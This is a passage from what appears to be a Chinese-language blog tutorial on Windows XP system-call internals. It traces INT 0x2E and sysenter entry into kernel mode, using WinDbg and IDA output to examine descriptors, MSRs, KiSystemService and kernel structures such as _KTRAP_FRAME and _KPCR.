<h2 id="3-分析-INT-0x2E-和-sysenter"><a href="#3-分析-INT-0x2E-和-sysenter" class="headerlink" title="3 分析 INT 0x2E 和 sysenter"></a>3 分析 INT 0x2E 和 sysenter</h2><h3 id="3-1-中断门进0环"><a href="#3-1-中断门进0环" class="headerlink" title="3.1 中断门进0环"></a>3.1 中断门进0环</h3><p><img data-src="https://s2.loli.net/2022/01/26/lrzeQEsgUFGw8Tm.png" alt="4.png"></p>
<p>EAX保存系统调用号，内核函数编号。<br>EDX保存的指针，指向函数参数的起始地址。<br>然后通过中断门进入内核。且中断号都是0x2E。</p>
<p>分析：<strong>INT 0x2E进0环</strong>。<br>步骤一：在IDT表中找到0x2E号门描述符。<br>步骤二：分析CS&#x2F;SS&#x2F;ESP&#x2F;EIP的来源。<br>步骤三：分析EIP是什么。</p>
<p>查看IDT表中的中断门描述符看一下提权跳转过程：</p>
<ol>
<li><p>0x2E &#x3D; 46D，即第47项。8054ee00&#96;00082451</p>
<p><img data-src="https://s2.loli.net/2022/01/26/HNrdkgY6aeqyJmR.png" alt="5.png"></p>
<p>可以看到：</p>
<ul>
<li><p>0xE &#x3D; 1110：P &#x3D; 1，DPL &#x3D; 11，S &#x3D; 0（<strong>系统段</strong>）。 </p>
</li>
<li><p>Type &#x3D; 0xE &#x3D; 1110： <strong>为32位中断门</strong>。</p>
</li>
<li><p>代码段选择子：0008 &#x3D; 1 0 00</p>
<ul>
<li>RPL &#x3D; 00</li>
<li>TI &#x3D; 0，查GDT</li>
<li>Index &#x3D; 1，第二项，查得<strong>00</strong>cf9b<strong>00</strong>&#96;<strong>0000</strong>ffff，代码段Base &#x3D; 0x0。</li>
</ul>
</li>
<li><p>中断门偏移：0x80542451</p>
</li>
<li><p>中断门跳转执行地址 &#x3D; Code.Base + Interrupt.Offset &#x3D; 0x0 + 0x80542451 &#x3D; 0x80542451。该地址已经为高2G（0环）。</p>
<p><img data-src="https://s2.loli.net/2022/01/29/niLUjlR5sg4Q6JD.png" alt="15.png"></p>
<p><img data-src="https://s2.loli.net/2021/12/19/RNkserCWtXMZF5D.png" alt="55.png"></p>
</li>
<li><p>得到EIP &#x3D; 0x80542451。这个是内核模块的<code>KiSystemService</code>函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; u <span class="number">0x80542451</span></span><br><span class="line">nt!KiSystemService:</span><br><span class="line"><span class="number">80542451</span> <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">80542453</span> <span class="number">55</span>              push    ebp</span><br><span class="line"><span class="number">80542454</span> <span class="number">53</span>              push    ebx</span><br><span class="line"><span class="number">80542455</span> <span class="number">56</span>              push    esi</span><br><span class="line"><span class="number">80542456</span> <span class="number">57</span>              push    edi</span><br><span class="line"><span class="number">80542457</span> <span class="number">0f</span>a0            push    fs</span><br><span class="line"><span class="number">80542459</span> bb30000000      mov     ebx,<span class="number">30</span>h</span><br><span class="line"><span class="number">8054245</span>e <span class="number">668</span>ee3          mov     fs,bx</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>综上，已经知道CS0来自调用门中的代码段选择子，EIP &#x3D; Code.Base + Interrupt.Offset &#x3D; 0x80542451。接下来还要分析来自TSS的SS0和ESP0。</p>
<ul>
<li><p>获取TR的值。（任务段执行流程：3环CALL<strong>任务段选择子</strong> –&gt; 根据段选择子到GDT找到对应任务段描述符 –&gt; 将任务段描述符加载到TR寄存器，同时根据任务段中的Base找到TSS内存块的起始地址 –&gt; 根据TSS中的EIP去执行代码 –&gt; IRETD返回。）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; r tr</span><br><span class="line">tr=<span class="number">00000028</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>可以得到TR寄存器选择子的值为0x28 &#x3D; 00101 0 00，Index &#x3D; 5，查GDT表如下。获取TSS任务段描述符。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; r gdtr</span><br><span class="line">gdtr=<span class="number">8003f</span>000</span><br><span class="line">kd&gt; dq <span class="number">8003f</span>000</span><br><span class="line"><span class="number">8003f</span>000  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00</span>cf9b00`<span class="number">0000f</span>fff</span><br><span class="line"><span class="number">8003f</span>010  <span class="number">00</span>cf9300`<span class="number">0000f</span>fff <span class="number">00</span>cffb00`<span class="number">0000f</span>fff</span><br><span class="line"><span class="number">8003f</span>020  <span class="number">00</span>cff300`<span class="number">0000f</span>fff <span class="number">80008b</span>04`<span class="number">200020</span>ab</span><br></pre></td></tr></table></figure>

<p>得到GDT描述符 &#x3D; 8000<strong>8b</strong>04&#96;200020ab，为32位TSS任务段，TSS.Base &#x3D; 0x80042000。</p>
</li>
</ul>
<p><img data-src="https://s2.loli.net/2021/12/22/ECYDcgjBQMkbJmK.png" alt="79.png"></p>
<ul>
<li><p>可以得到：ESP0 &#x3D;0xaabe9de0，SS0 &#x3D; 0x0010。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dd <span class="number">0x80042000</span></span><br><span class="line"><span class="number">80042000</span>  <span class="number">0</span>c458b24 aabe9de0 <span class="number">8b</span>080010 <span class="number">758b</span>0855</span><br><span class="line"><span class="number">80042010</span>  eac14008 ffe68110 <span class="number">030000f</span>f <span class="number">06e400</span>a0</span><br><span class="line"><span class="number">80042020</span>  e1750855 <span class="number">08458b</span>5e <span class="number">0310e8</span>c1 c25d0845</span><br></pre></td></tr></table></figure>

<p><img data-src="https://s2.loli.net/2021/12/20/y3UogsCh7piWzId.png" alt="76.png"></p>
</li>
</ul>
</li>
</ol>
<h3 id="3-2-快速调用进0环"><a href="#3-2-快速调用进0环" class="headerlink" title="3.2 快速调用进0环"></a>3.2 快速调用进0环</h3><p>在执行sysenter指令之前，操作系统必须指定0环的CS段、SS段、EIP以及ESP，SS &#x3D; CS+8。操作系统会提前将CS&#x2F;SS&#x2F;ESP&#x2F;EIP的值存储在MSR寄存器中，sysenter指令执行时，CPU会将MSR寄存器中的值直接写入相关寄存器，没有读内存的过程，所以叫快速调用，本质是一样的！</p>
<table>
<thead>
<tr>
<th>MSR</th>
<th>地址</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>IA32_SYSENTER_CS</td>
<td>174H</td>
<td>低16位值指定了特权级0的代码段和栈段的段选择符</td>
</tr>
<tr>
<td>IA32_SYSENTER_ESP</td>
<td>175H</td>
<td>内核栈指针的32 位偏移</td>
</tr>
<tr>
<td>IA32_SYSENTER_EIP</td>
<td>176H</td>
<td>目标例程的32位偏移</td>
</tr>
</tbody></table>
<p>可以通过<code>RDMSR/WRMST</code>来进行读写（操作系统使用WRMST写该寄存器）:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; rdmsr <span class="number">174</span></span><br><span class="line">msr[<span class="number">174</span>] = <span class="number">00000000</span>`<span class="number">00000008</span>	<span class="comment">//查看CS</span></span><br><span class="line">kd&gt; rdmsr <span class="number">175</span></span><br><span class="line">msr[<span class="number">175</span>] = <span class="number">00000000</span>`f7a1a000	<span class="comment">//查看ESP</span></span><br><span class="line">kd&gt; rdmsr <span class="number">176</span></span><br><span class="line">msr[<span class="number">176</span>] = <span class="number">00000000</span>`<span class="number">80542520</span>	<span class="comment">//查看EIP</span></span><br><span class="line">  SS = CS + <span class="number">8</span> = <span class="number">0x8</span> + <span class="number">8</span> = <span class="number">0x10</span></span><br><span class="line">  </span><br><span class="line">kd&gt; u <span class="number">80542520</span></span><br><span class="line">nt!KiFastCallEntry:</span><br><span class="line"><span class="number">80542520</span> b923000000      mov     ecx,<span class="number">23</span>h</span><br><span class="line"><span class="number">80542525</span> <span class="number">6</span>a30            push    <span class="number">30</span>h</span><br><span class="line"><span class="number">80542527</span> <span class="number">0f</span>a1            pop     fs</span><br><span class="line"><span class="number">80542529</span> <span class="number">8</span>ed9            mov     ds,cx</span><br><span class="line"><span class="number">8054252b</span> <span class="number">8</span>ec1            mov     es,cx</span><br><span class="line"><span class="number">8054252</span>d <span class="number">648b</span>0d40000000  mov     ecx,dword ptr fs:[<span class="number">40</span>h]</span><br><span class="line"><span class="number">80542534</span> <span class="number">8b</span>6104          mov     esp,dword ptr [ecx+<span class="number">4</span>]</span><br><span class="line"><span class="number">80542537</span> <span class="number">6</span>a23            push    <span class="number">23</span>h</span><br></pre></td></tr></table></figure>

<p>操作系统启动的时候就已经把这些值写入到MSR寄存器中了。</p>
<h3 id="3-3-总结"><a href="#3-3-总结" class="headerlink" title="3.3 总结"></a>3.3 总结</h3><p>API通过中断门进0环：<br>    1)  固定中断号为0x2E<br>    2)  CS&#x2F;EIP由门描述符提供，ESP&#x2F;SS由TSS提供<br>    3)  进入0环后执行的内核函数：<code>NT!KiSystemService</code></p>
<p>API通过sysenter指令进0环：<br>    1)  CS&#x2F;ESP&#x2F;EIP由MSR寄存器提供(SS是算出来的)<br>    2)  进入0环后执行的内核函数：<code>NT!KiFastCallEntry</code></p>
<p>内核模块：<code>ntoskrnl.exe/ntkrnlpa.exe</code>（10-10-12&#x2F;2-9-9-12）</p>
<h2 id="4-进入0环后分析"><a href="#4-进入0环后分析" class="headerlink" title="4 进入0环后分析"></a>4 进入0环后分析</h2><p>之前的课程，我们学习了API系统调用在3环部分做的事情，有两种方式进0环，分别是中断门<code>int 0x2e</code>和快速调用<code>sysenter</code>。通过中断门进入0环后，会调用函数<code>KiSystemService</code>、通过快速调用进入0环后会调用函数<code>KiFastCallEntry</code>。</p>
<div class="note success"><p>分析之前，思考四个问题：</p>
<ol>
<li>进0环后，原来的寄存器存在哪里？</li>
<li>如何根据系统调用号（eax中存储）找到要执行的内核函数？</li>
<li>调用时参数是存储到3环的堆栈，如何传递给内核函数？</li>
<li>2种调用方式是如何返回到3环的？</li>
</ol>
</div>

<p>要分析 KiSystemService 和 KiFastCallEntry ，我们需要先了解几个结构体，_Trap_Frame，_ETHREAD，_KTHREAD，_KPCR，_NT_TIB 和 _KPRCB。</p>
<p>接下来，按照 KiSystemService 代码执行顺序，依次介绍涉及到的结构体。</p>
<h3 id="4-1-分析KiSystemService"><a href="#4-1-分析KiSystemService" class="headerlink" title="4.1 分析KiSystemService"></a>4.1 分析KiSystemService</h3><p>本节通过分析中断门<code>int 0x2e</code>进入0环后，调用函数<code>KiSystemService</code>的过程，解释线程进0环后，原来的寄存器存在哪里？</p>
<p>使用IDA Pro打开ntkrnlpa.exe，并连接远程ntkrnlpa.pdb文件（<a href="https://catecat.top/post/WinXP-Driver/">Windows XP 驱动开发（一）</a>第二章节）。</p>
<ol>
<li><p>Alt+T搜索_IDT。</p>
<p><img data-src="https://s2.loli.net/2022/02/17/kcvgJG2BRV8hnqx.png" alt="8.png"></p>
</li>
<li><p>双击后如下。</p>
<p><img data-src="https://s2.loli.net/2022/02/17/UGBcpeYkAdNFqOI.png" alt="9.png"></p>
</li>
<li><p>找到<code>0x2e</code>对应的<code>KiSystemService</code>函数然后双击。待会儿分析<code>push 0</code>的含义。</p>
<p><img data-src="https://s2.loli.net/2022/02/17/DPSQvG9mfuZ4jrJ.png" alt="10.png"></p>
</li>
<li><p>保存3环的通用寄存器。</p>
<ul>
<li>从3环进入0环的时候，CPU会往0环的堆栈压5个值：eip、cs、eflag、esp、ss。</li>
<li>但是操作系统会将3环的寄存器都保存起来，方便从0环返回，于是操作系统就维护了一个<code>_Trap_Frame</code>结构来保存这些3环的寄存器。</li>
</ul>
</li>
</ol>
<h3 id="4-2-Trap-Frame结构"><a href="#4-2-Trap-Frame结构" class="headerlink" title="4.2 _Trap_Frame结构"></a>4.2 _Trap_Frame结构</h3><p>首先复习一下TSS表，一个CPU只有一张TSS表，但是系统里有成百上千的线程，线程进0环时，假设使用中断门，0环的ESP和SS从TSS表获取，怎么保证每个线程都有自己的堆栈，不互相冲突呢？答案是，线程切换时会修改TSS表，确保每个线程执行时，TSS里的ESP，SS都对应当前线程。</p>
<p><code>_Trap_Frame</code>是线程在0环的堆栈结构，由操作系统维护。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _KTrap_Frame -v</span><br><span class="line">nt!_KTRAP_FRAME</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">KTRAP_FRAME</span>, 35 <span class="title">elements</span>, 0<span class="title">x8c</span> <span class="title">bytes</span></span></span><br><span class="line"><span class="class">   +0<span class="title">x000</span> <span class="title">DbgEbp</span>           :</span> Uint4B</span><br><span class="line">   +<span class="number">0x004</span> DbgEip           : Uint4B</span><br><span class="line">   +<span class="number">0x008</span> DbgArgMark       : Uint4B</span><br><span class="line">   +<span class="number">0x00c</span> DbgArgPointer    : Uint4B</span><br><span class="line">   +<span class="number">0x010</span> TempSegCs        : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> TempEsp          : Uint4B</span><br><span class="line">   +<span class="number">0x018</span> Dr0              : Uint4B</span><br><span class="line">   +<span class="number">0x01c</span> Dr1              : Uint4B</span><br><span class="line">   +<span class="number">0x020</span> Dr2              : Uint4B</span><br><span class="line">   +<span class="number">0x024</span> Dr3              : Uint4B</span><br><span class="line">   +<span class="number">0x028</span> Dr6              : Uint4B</span><br><span class="line">   +<span class="number">0x02c</span> Dr7              : Uint4B</span><br><span class="line">   +<span class="number">0x030</span> SegGs            : Uint4B</span><br><span class="line">   +<span class="number">0x034</span> SegEs            : Uint4B</span><br><span class="line">   +<span class="number">0x038</span> SegDs            : Uint4B</span><br><span class="line">   +<span class="number">0x03c</span> Edx              : Uint4B</span><br><span class="line">   +<span class="number">0x040</span> Ecx              : Uint4B</span><br><span class="line">   +<span class="number">0x044</span> Eax              : Uint4B</span><br><span class="line">   +<span class="number">0x048</span> PreviousPreviousMode : Uint4B</span><br><span class="line">   +<span class="number">0x04c</span> ExceptionList    : Ptr32 to <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span>, 2 <span class="title">elements</span>, 0<span class="title">x8</span> <span class="title">bytes</span></span></span><br><span class="line"><span class="class">   +0<span class="title">x050</span> <span class="title">SegFs</span>            :</span> Uint4B</span><br><span class="line">   +<span class="number">0x054</span> Edi              : Uint4B</span><br><span class="line">   +<span class="number">0x058</span> Esi              : Uint4B</span><br><span class="line">   +<span class="number">0x05c</span> Ebx              : Uint4B</span><br><span class="line">   +<span class="number">0x060</span> Ebp              : Uint4B</span><br><span class="line">   +<span class="number">0x064</span> ErrCode          : Uint4B</span><br><span class="line">   +<span class="number">0x068</span> Eip              : Uint4B</span><br><span class="line">   +<span class="number">0x06c</span> SegCs            : Uint4B</span><br><span class="line">   +<span class="number">0x070</span> EFlags           : Uint4B</span><br><span class="line">   +<span class="number">0x074</span> HardwareEsp      : Uint4B</span><br><span class="line">   +<span class="number">0x078</span> HardwareSegSs    : Uint4B</span><br><span class="line">   +<span class="number">0x07c</span> V86Es            : Uint4B</span><br><span class="line">   +<span class="number">0x080</span> V86Ds            : Uint4B</span><br><span class="line">   +<span class="number">0x084</span> V86Fs            : Uint4B</span><br><span class="line">   +<span class="number">0x088</span> V86Gs            : Uint4B</span><br></pre></td></tr></table></figure>

<div class="note danger"><p>一个线程一个<code>_Trap_Frame</code>结构，每个线程有一个自己的ESP0，该ESP0指示该线程0环下的<mark class="label warning">堆栈</mark>（<code>_Trap_Frame</code>结构）在哪。</p>
</div>

<p><img data-src="https://s2.loli.net/2022/02/17/yoJmLCOheZuVgKH.png" alt="11.png"></p>
<p>其中：</p>
<ul>
<li>高4个成员仅在虚拟8086模式下使用。</li>
<li>从TSS中获取的ESP0一开始指向0x7C。（从TSS中获取ESP0后才能知道0环的堆栈在哪）</li>
<li>从0x68～0x78由中断门进入0环时CPU自己填充。</li>
<li>一个线程一个<code>_Trap_Frame</code>结构。</li>
<li>一个CPU只有一块TSS内存块，每次线程切换时，TSS中的值都被更新为当前线程对应的值。</li>
</ul>
<p>结合<code>_Trap_Frame</code>结构分析函数<code>KiSystemService</code>分析：</p>
<p><img data-src="https://s2.loli.net/2022/02/18/hQydqPimblTR4GH.png" alt="12.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">push    <span class="number">0</span>	<span class="comment">//push ErrCode</span></span><br><span class="line">push    ebp</span><br><span class="line">push    ebx</span><br><span class="line">push    esi</span><br><span class="line">push    edi</span><br><span class="line">push    fs</span><br><span class="line">  </span><br><span class="line">mov     ebx, <span class="number">30</span>h</span><br><span class="line">mov     fs, bx	<span class="comment">//fs = 0x30 --&gt; 00110 0 00 --&gt; GDT --&gt;ffc093df`f0000001(数据段)</span></span><br><span class="line">push    dword ptr ds:<span class="number">0F</span>FDFF000h</span><br><span class="line">mov     dword ptr ds:<span class="number">0F</span>FDFF000h,OFFFFFFFFh</span><br><span class="line">mov     esi,ds:<span class="number">0F</span>FDFF124h</span><br><span class="line">push    dword ptr [esi+<span class="number">140</span>h]</span><br><span class="line">sub     esp,<span class="number">48</span>h</span><br><span class="line">mov     ebx,[esp+<span class="number">68</span>h+arg_0]</span><br><span class="line"><span class="keyword">and</span>     ebx,<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>可以看到段寄存器FS的在GDT表中对应的段描述符为ffc093df&#96;f0000001，是一个数据段，FS.Base &#x3D; 0xFFDFF000。</p>
<p>此时的FS有了新的含义，<mark class="label warning">在3环，FS[0]指向TEB结构</mark>。但是在0环FS段寄存器被重新赋值，也有了新的意义，<mark class="label success">0环的FS指向一个KPCR的结构体</mark>。</p>
<h3 id="4-3-KPCR结构"><a href="#4-3-KPCR结构" class="headerlink" title="4.3 _KPCR结构"></a>4.3 _KPCR结构</h3><p>KPCR是个结构体，用来<strong>描述CPU状态</strong>。叫CPU控制区（Processor Control Region）。</p>
<p>CPU也有自己的控制块，每一个CPU有一个，叫KPCR。</p>
<div class="note default"><p>0环下FS段寄存器的基址，即FS[0]指向KPCR结构，这里为<code>0xFFDFF000</code>。</p>
</div>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _KPCR</span><br><span class="line">nt!_KPCR</span><br><span class="line">   +<span class="number">0x000</span> NtTib            : _NT_TIB</span><br><span class="line">   +<span class="number">0x01c</span> SelfPcr          : Ptr32 _KPCR</span><br><span class="line">   +<span class="number">0x020</span> Prcb             : Ptr32 _KPRCB</span><br><span class="line">   +<span class="number">0x024</span> Irql             : UChar</span><br><span class="line">   +<span class="number">0x028</span> IRR              : Uint4B</span><br><span class="line">   +<span class="number">0x02c</span> IrrActive        : Uint4B</span><br><span class="line">   +<span class="number">0x030</span> IDR              : Uint4B</span><br><span class="line">   +<span class="number">0x034</span> KdVersionBlock   : Ptr32 Void</span><br><span class="line">   +<span class="number">0x038</span> IDT              : Ptr32 _KIDTENTRY</span><br><span class="line">   +<span class="number">0x03c</span> GDT              : Ptr32 _KGDTENTRY</span><br><span class="line">   +<span class="number">0x040</span> TSS              : Ptr32 _KTSS</span><br><span class="line">   +<span class="number">0x044</span> MajorVersion     : Uint2B</span><br><span class="line">   +<span class="number">0x046</span> MinorVersion     : Uint2B</span><br><span class="line">   +<span class="number">0x048</span> SetMember        : Uint4B</span><br><span class="line">   +<span class="number">0x04c</span> StallScaleFactor : Uint4B</span><br><span class="line">   +<span class="number">0x050</span> DebugActive      : UChar</span><br><span class="line">   +<span class="number">0x051</span> Number           : UChar</span><br><span class="line">   +<span class="number">0x052</span> Spare0           : UChar</span><br><span class="line">   +<span class="number">0x053</span> SecondLevelCacheAssociativity : UChar</span><br><span class="line">   +<span class="number">0x054</span> VdmAlert         : Uint4B</span><br><span class="line">   +<span class="number">0x058</span> KernelReserved   : [<span class="number">14</span>] Uint4B</span><br><span class="line">   +<span class="number">0x090</span> SecondLevelCacheSize : Uint4B</span><br><span class="line">   +<span class="number">0x094</span> HalReserved      : [<span class="number">16</span>] Uint4B</span><br><span class="line">   +<span class="number">0x0d4</span> InterruptMode    : Uint4B</span><br><span class="line">   +<span class="number">0x0d8</span> Spare1           : UChar</span><br><span class="line">   +<span class="number">0x0dc</span> KernelReserved2  : [<span class="number">17</span>] Uint4B</span><br><span class="line">   +<span class="number">0x120</span> PrcbData         : _KPRCB</span><br></pre></td></tr></table></figure>

<p>查看CPU数量（这里是单核）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dd KeNumberProcessors </span><br><span class="line"><span class="number">80556</span>a60  <span class="number">00000001</span> <span class="number">00000006</span> <span class="number">00008e0</span>a a0013fff</span><br><span class="line"><span class="number">80556</span>a70  <span class="number">806</span>ceec0 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000061</span></span><br></pre></td></tr></table></figure>

<p>_KPCR结构中比较重要的两个结构（第一个和最后一个）：<mark class="label info">_NT_TIB</mark>、<mark class="label primary">_KPRCB</mark></p>
<h4 id="4-3-1-NT-TIB结构"><a href="#4-3-1-NT-TIB结构" class="headerlink" title="4.3.1 _NT_TIB结构"></a>4.3.1 _NT_TIB结构</h4><p>先分析第一个结构<mark class="label info">_NT_TIB</mark>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _NT_TIB</span><br><span class="line">ntdll!_NT_TIB</span><br><span class="line">   +<span class="number">0x000</span> ExceptionList    : Ptr32 _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x004</span> StackBase        : Ptr32 Void</span><br><span class="line">   +<span class="number">0x008</span> StackLimit       : Ptr32 Void</span><br><span class="line">   +<span class="number">0x00c</span> SubSystemTib     : Ptr32 Void</span><br><span class="line">   +<span class="number">0x010</span> FiberData        : Ptr32 Void</span><br><span class="line">   +<span class="number">0x010</span> Version          : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> ArbitraryUserPointer : Ptr32 Void</span><br><span class="line">   +<span class="number">0x018</span> Self             : Ptr32 _NT_TIB	<span class="comment">//结构体指针指向自己</span></span><br></pre></td></tr></table></figure>

<p>第一个成员<code>_EXCEPTION_REGISTRATION_RECORD</code>是一个异常链表，存储的是异常的处理函数。</p>
<p>接着分析<code>KiSystemService</code>函数和<code>_Trap_Frame</code>结构、<code>_KPCR</code>结构：</p>
<p><img data-src="https://s2.loli.net/2022/02/18/7SsVL8M3bTDrHAa.png" alt="13.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">push    dword ptr ds:<span class="number">0F</span>FDFF000h</span><br><span class="line">mov     dword ptr ds:<span class="number">0F</span>FDFF000h,OFFFFFFFFh</span><br></pre></td></tr></table></figure>

<p>PUSH的作用就是保存老的异常链表，然后将新的<code>ExceptionList</code>设为-1。</p>
<h4 id="4-3-2-KPRCB结构"><a href="#4-3-2-KPRCB结构" class="headerlink" title="4.3.2 _KPRCB结构"></a>4.3.2 _KPRCB结构</h4><p>下面列举该结构的成员：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _KPRCB</span><br><span class="line">ntdll!_KPRCB</span><br><span class="line">   +<span class="number">0x000</span> MinorVersion     : Uint2B</span><br><span class="line">   +<span class="number">0x002</span> MajorVersion     : Uint2B</span><br><span class="line">   +<span class="number">0x004</span> CurrentThread    : Ptr32 _KTHREAD	<span class="comment">//当前CPU所执行线程的_ETHREAD</span></span><br><span class="line">   +<span class="number">0x008</span> NextThread       : Ptr32 _KTHREAD	<span class="comment">//下一个_ETHREAD</span></span><br><span class="line">   +<span class="number">0x00c</span> IdleThread       : Ptr32 _KTHREAD</span><br><span class="line">   +<span class="number">0x010</span> Number           : Char		<span class="comment">//CPU编号</span></span><br><span class="line">   +<span class="number">0x011</span> Reserved         : Char</span><br><span class="line">   +<span class="number">0x012</span> BuildType        : Uint2B</span><br><span class="line">   +<span class="number">0x014</span> SetMember        : Uint4B</span><br><span class="line">   +<span class="number">0x018</span> CpuType          : Char</span><br><span class="line">   +<span class="number">0x019</span> CpuID            : Char</span><br><span class="line">   +<span class="number">0x01a</span> CpuStep          : Uint2B</span><br><span class="line">   +<span class="number">0x01c</span> ProcessorState   : _KPROCESSOR_STATE</span><br><span class="line">   +<span class="number">0x33c</span> KernelReserved   : [<span class="number">16</span>] Uint4B</span><br><span class="line">   +<span class="number">0x37c</span> HalReserved      : [<span class="number">16</span>] Uint4B</span><br><span class="line">   +<span class="number">0x3bc</span> PrcbPad0         : [<span class="number">92</span>] UChar</span><br><span class="line">   +<span class="number">0x418</span> LockQueue        : [<span class="number">16</span>] _KSPIN_LOCK_QUEUE</span><br><span class="line">   +<span class="number">0x498</span> PrcbPad1         : [<span class="number">8</span>] UChar</span><br><span class="line">   +<span class="number">0x4a0</span> NpxThread        : Ptr32 _KTHREAD</span><br><span class="line">   +<span class="number">0x4a4</span> InterruptCount   : Uint4B</span><br><span class="line">   +<span class="number">0x4a8</span> KernelTime       : Uint4B</span><br><span class="line">   +<span class="number">0x4ac</span> UserTime         : Uint4B</span><br><span class="line">   +<span class="number">0x4b0</span> DpcTime          : Uint4B</span><br><span class="line">   +<span class="number">0x4b4</span> DebugDpcTime     : Uint4B</span><br><span class="line">   +<span class="number">0x4b8</span> InterruptTime    : Uint4B</span><br><span class="line">   +<span class="number">0x4bc</span> AdjustDpcThreshold : Uint4B</span><br><span class="line">   +<span class="number">0x4c0</span> PageColor        : Uint4B</span><br><span class="line">   +<span class="number">0x4c4</span> SkipTick         : Uint4B</span><br><span class="line">   +<span class="number">0x4c8</span> MultiThreadSetBusy : UChar</span><br><span class="line">   +<span class="number">0x4c9</span> Spare2           : [<span class="number">3</span>] UChar</span><br><span class="line">   +<span class="number">0x4cc</span> ParentNode       : Ptr32 _KNODE</span><br><span class="line">   +<span class="number">0x4d0</span> MultiThreadProcessorSet : Uint4B</span><br><span class="line">   +<span class="number">0x4d4</span> MultiThreadSetMaster : Ptr32 _KPRCB</span><br><span class="line">   +<span class="number">0x4d8</span> ThreadStartCount : [<span class="number">2</span>] Uint4B</span><br><span class="line">   +<span class="number">0x4e0</span> CcFastReadNoWait : Uint4B</span><br><span class="line">   +<span class="number">0x4e4</span> CcFastReadWait   : Uint4B</span><br><span class="line">   +<span class="number">0x4e8</span> CcFastReadNotPossible : Uint4B</span><br><span class="line">   +<span class="number">0x4ec</span> CcCopyReadNoWait : Uint4B</span><br><span class="line">   +<span class="number">0x4f0</span> CcCopyReadWait   : Uint4B</span><br><span class="line">   +<span class="number">0x4f4</span> CcCopyReadNoWaitMiss : Uint4B</span><br><span class="line">   +<span class="number">0x4f8</span> KeAlignmentFixupCount : Uint4B</span><br><span class="line">   +<span class="number">0x4fc</span> KeContextSwitches : Uint4B</span><br><span class="line">   +<span class="number">0x500</span> KeDcacheFlushCount : Uint4B</span><br><span class="line">   +<span class="number">0x504</span> KeExceptionDispatchCount : Uint4B</span><br><span class="line">   +<span class="number">0x508</span> KeFirstLevelTbFills : Uint4B</span><br><span class="line">   +<span class="number">0x50c</span> KeFloatingEmulationCount : Uint4B</span><br><span class="line">   +<span class="number">0x510</span> KeIcacheFlushCount : Uint4B</span><br><span class="line">   +<span class="number">0x514</span> KeSecondLevelTbFills : Uint4B</span><br><span class="line">   +<span class="number">0x518</span> KeSystemCalls    : Uint4B</span><br><span class="line">   +<span class="number">0x51c</span> SpareCounter0    : [<span class="number">1</span>] Uint4B</span><br><span class="line">   +<span class="number">0x520</span> PPLookasideList  : [<span class="number">16</span>] _PP_LOOKASIDE_LIST</span><br><span class="line">   +<span class="number">0x5a0</span> PPNPagedLookasideList : [<span class="number">32</span>] _PP_LOOKASIDE_LIST</span><br><span class="line">   +<span class="number">0x6a0</span> PPPagedLookasideList : [<span class="number">32</span>] _PP_LOOKASIDE_LIST</span><br><span class="line">   +<span class="number">0x7a0</span> PacketBarrier    : Uint4B</span><br><span class="line">   +<span class="number">0x7a4</span> ReverseStall     : Uint4B</span><br><span class="line">   +<span class="number">0x7a8</span> IpiFrame         : Ptr32 Void</span><br><span class="line">   +<span class="number">0x7ac</span> PrcbPad2         : [<span class="number">52</span>] UChar</span><br><span class="line">   +<span class="number">0x7e0</span> CurrentPacket    : [<span class="number">3</span>] Ptr32 Void</span><br><span class="line">   +<span class="number">0x7ec</span> TargetSet        : Uint4B</span><br><span class="line">   +<span class="number">0x7f0</span> WorkerRoutine    : Ptr32     <span class="keyword">void</span> </span><br><span class="line">   +<span class="number">0x7f4</span> IpiFrozen        : Uint4B</span><br><span class="line">   +<span class="number">0x7f8</span> PrcbPad3         : [<span class="number">40</span>] UChar</span><br><span class="line">   +<span class="number">0x820</span> RequestSummary   : Uint4B</span><br><span class="line">   +<span class="number">0x824</span> SignalDone       : Ptr32 _KPRCB</span><br><span class="line">   +<span class="number">0x828</span> PrcbPad4         : [<span class="number">56</span>] UChar</span><br><span class="line">   +<span class="number">0x860</span> DpcListHead      : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x868</span> DpcStack         : Ptr32 Void</span><br><span class="line">   +<span class="number">0x86c</span> DpcCount         : Uint4B</span><br><span class="line">   +<span class="number">0x870</span> DpcQueueDepth    : Uint4B</span><br><span class="line">   +<span class="number">0x874</span> DpcRoutineActive : Uint4B</span><br><span class="line">   +<span class="number">0x878</span> DpcInterruptRequested : Uint4B</span><br><span class="line">   +<span class="number">0x87c</span> DpcLastCount     : Uint4B</span><br><span class="line">   +<span class="number">0x880</span> DpcRequestRate   : Uint4B</span><br><span class="line">   +<span class="number">0x884</span> MaximumDpcQueueDepth : Uint4B</span><br><span class="line">   +<span class="number">0x888</span> MinimumDpcRate   : Uint4B</span><br><span class="line">   +<span class="number">0x88c</span> QuantumEnd       : Uint4B</span><br><span class="line">   +<span class="number">0x890</span> PrcbPad5         : [<span class="number">16</span>] UChar</span><br><span class="line">   +<span class="number">0x8a0</span> DpcLock          : Uint4B</span><br><span class="line">   +<span class="number">0x8a4</span> 